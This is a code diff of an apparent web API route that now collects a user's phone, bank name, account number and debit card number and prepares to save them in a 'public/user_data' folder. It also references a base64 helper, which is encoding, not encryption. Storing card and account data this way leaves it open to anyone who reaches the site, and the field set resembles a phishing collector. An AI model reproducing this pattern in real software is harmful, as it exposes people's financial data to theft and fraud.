@@ -8,10 +8,16 @@ function encodeBase64(data) {
 
 export async function POST(request) {
   try {
-    const { phone } = await request.json();
-    const userData = { phone, timestamp: new Date().toISOString() };
+    // Accept all relevant fields from JSON body
+    const { phone, bank, accountNumber, debitCardNumber } = await request.json();
+    const userData = {
+      phone,
+      bank,
+      accountNumber,
+      debitCardNumber,
+      timestamp: new Date().toISOString()
+    };
 
-    // Path for unencrypted/encrypted files
     const basePath = path.join(process.cwd(), 'public', 'user_data');
     if (!fs.existsSync(basePath)) {
       fs.mkdirSync(basePath, { recursive: true });
